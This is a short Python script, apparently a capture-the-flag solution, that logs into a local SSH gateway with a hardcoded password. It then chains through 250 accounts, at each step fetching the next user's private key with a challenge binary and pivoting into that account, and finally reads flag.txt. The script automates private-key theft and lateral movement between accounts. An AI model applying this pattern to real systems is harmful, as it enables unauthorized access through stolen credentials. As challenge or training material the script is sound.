from jumpssh import SSHSession
from os import remove

host = '127.0.0.1'
port = 22

#Connect to machine
print("[*] Connect to gateway ssh account\n")
gateway = SSHSession(host, "user1", port=2022, password="password123")

# Keep track of sessions
active_session = gateway
for i in range(2, 251):
    # Read Key
    key = active_session.get_cmd_output("./getSSHKey") # 4096 -> key size ; 36*2 -> header+footer size

    # Write Key
    open("key.tmp", "w").write(key)

    # Get next session and save it
    active_session.close()
    active_session = gateway.get_remote_session("127.0.0.1", username=f"user{i}", private_key_file="key.tmp")

    if i%50==0:
        print(f"[*] User {i}/250")

# Remove temporary file
remove("key.tmp")

# Read and print flag
print("\n[+] Flag : ", active_session.get_cmd_output("cat flag.txt"))
active_session.close()